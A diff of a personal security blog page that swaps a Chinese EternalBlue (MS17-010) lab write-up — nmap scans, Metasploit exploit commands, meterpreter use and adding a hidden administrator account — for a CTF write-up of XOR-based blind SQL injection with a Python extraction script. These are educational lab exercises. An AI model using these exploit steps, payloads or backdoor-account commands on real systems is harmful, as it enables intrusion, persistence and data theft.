@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>永恒之蓝ms17_010复现 - qiyeNuLl&#39;s blog</title>
+  <title>CISCN2019 华北赛区 Day2 Web1 Hack World 1 - qiyeNuLl&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="永恒之蓝ms17_010复现">
+            <span class="h2" id="subtitle" title="CISCN2019 华北赛区 Day2 Web1 Hack World 1">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-18 00:03" pubdate>
-        October 18, 2021 am
+      <time datetime="2021-10-20 17:44" pubdate>
+        October 20, 2021 pm
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      456 字
+      337 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      4
        分钟
     </span>
   
@@ -225,45 +225,27 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">永恒之蓝ms17_010复现</h1>
+            <h1 style="display: none">CISCN2019 华北赛区 Day2 Web1 Hack World 1</h1>
             
             <div class="markdown-body">
-              <p>﻿﻿<strong>永恒之蓝ms17_010复现</strong></p>
+              <p>﻿<strong>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</strong><br><a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></p>
 <hr />
 
-
-<p><strong>永恒之蓝ms17_010</strong></p>
-<p>2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。</p>
-<p>来源于：百度百科</p>
+<p><strong>解题点：</strong></p>
+<p>异或盲注</p>
 <hr />
 
+<p><strong>1.fuzz</strong><br>bp抓包，对post参数id进行fuzz测试<br>and、or、group_concat均被过滤</p>
+<p>但是题目很友好，把flag所在表名和字段名都给你，能省很多事</p>
+<p>感谢大佬整理：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45793883/article/details/104728901">sql-fuzz字典</a></p>
+<p><strong>2.异或注入</strong><br>输入<code>1，2</code>均有回显<br>但输入字母，会回显<code>bool(false)</code><br>可以确定是数字型注入</p>
+<p>但介于and和or被过滤，所以使用异或注入</p>
+<p><code>0^1</code>能正常回显<code>Hello, glzjin wants a girlfriend.</code>（me too.）<br>可以对库名长度进行爆破<br>0^(length(database())&gt;=1)<br>经过一波测试，11正常，12报错<br>那么数据库名长度为11<br>我甚至把库名爆破出来了，但后来发现没必要<br>库名：<code>ctftraii8ng</code></p>
+<p><strong>3.脚本盲注</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://4af4aa9c-beca-4eac-8b4d-d1fe78022077.node4.buuoj.cn:81&quot;</span><br>name=<span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">129</span><br>    mid=(low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;high:<br>        <span class="hljs-comment">#payload = &quot;0^(ascii(substr((select(database())),%d,1))&gt;%d)&quot; % (i, mid)</span><br>        payload = <span class="hljs-string">&quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot;</span> % (i, mid)<br>        <br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span> : payload<br>        &#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high=mid<br>        mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span>):<br>            <span class="hljs-keyword">break</span><br>    name=name+<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span> (name)<br></code></pre></td></tr></table></figure>
 
-<h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>攻击机：kali linux<br>靶机：win 7 企业版</p>
-<hr />
-
-<p><strong>1 主机存活扫描</strong></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nmap <span class="hljs-literal">-sP</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">241.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/9d54fa6aa6994273848ba454de904dc2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="alive"><br><strong>2 主机端口扫描</strong></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nmap <span class="hljs-literal">-sV</span> <span class="hljs-literal">-Pn</span> <span class="hljs-literal">-v</span> <span class="hljs-literal">-T4</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/cf3c1c45db8a4c16b8e02bb8bcb24ff4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="端口"><br>win 7?   端口 445?</p>
-<p><strong>3 永恒之蓝ms17_010复现</strong></p>
-<p>msf开起来</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msfconsole<br>search ms17_010<br>use auxiliary/scanner/smb/smb_ms17_010<br>show options<br><span class="hljs-built_in">set</span> THREADS <span class="hljs-number">40</span><br><span class="hljs-built_in">set</span> RHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span><br>run<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/ec24c6c1eaa540bf8ecbb3a2a7549b25.png#pic_center" srcset="/img/loading.gif" lazyload alt="哦豁"><br>ok 可以利用</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">use exploit/windows/smb/ms17_010_eternalblue<br>show options<br><span class="hljs-built_in">set</span> RHOSTS <span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span><br>exploit<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/f5863f74e22c496795ca39efef78f791.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="顺利到我觉得有问题"><br>取得meterpreter控制台</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">没啥好说的，信息收集<br>meterpreter &gt; sysinfo<br>meterpreter &gt; getuid<br>meterpreter &gt; screenshot<br>meterpreter &gt; shell<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/ef03af2078e442398c0a37df1c069034.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="信息收集"><br>获取win 7桌面截图</p>
-<p><img src="https://img-blog.csdnimg.cn/08b681bda0a6471a8c75c7a256954b81.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="截图"><br>接着是windows 7提权<br>自己是管理员，那么我增加一个用户cyber ,并将他加入到管理员组</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami                         //当前用户<br>net user                       //查看存在用户<br>net user cyber cyber /add      //增加一个名为cyber的用户<br>net localgroup administrators cyber /add    //把cyber用户加到用户组<br></code></pre></td></tr></table></figure>
-
-
-<p>win7打开计算机管理<br><img src="https://img-blog.csdnimg.cn/6254d61033a3486f8f97bc34a1015785.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="不可思议"></p>
-<p><strong>可以发现，cyber已经是管理员用户组的一员了<br>接下来则是后门和痕迹清理（暂时鸽了）</strong></p>
-<hr />
-
-<p>原本没去做永恒之蓝的想法，但是作业。。。一言难尽啊（可能这就是学业上的差距吧）<br><img src="https://img-blog.csdnimg.cn/8d5a885476bd472b9c842d44c730cefe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="唉"><br>没办法，得给自己加工，于是有永恒之蓝的想法。</p>
+<p>low和high的值可能需要调整范围（因为爆破出几个有问题的flag）</p>
+<p>正确flag：<br><img src="https://img-blog.csdnimg.cn/53e5e5b4fa4f4f289ff6c24ed1759454.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" srcset="/img/loading.gif" lazyload alt="唉"></p>
 
             </div>
             <hr>
@@ -273,7 +255,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                     
                   </div>
                 
@@ -281,9 +263,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Windows/">Windows</a>
-                    
-                      <a class="hover-with-bg" href="/tags/ms17-010/">ms17_010</a>
+                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
                     
                   </div>
                 
@@ -300,18 +280,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/20/%5BMRCTF2020%5DEz_bypass%201/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MRCTF2020 Ez_bypass 1</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/14/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%AD%E7%BB%83/">
-                        <span class="hidden-mobile">Oracle数据库查询训练</span>
+                      <a href="/2021/10/20/%5BMRCTF2020%5DEz_bypass%201/">
+                        <span class="hidden-mobile">MRCTF2020 Ez_bypass 1</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
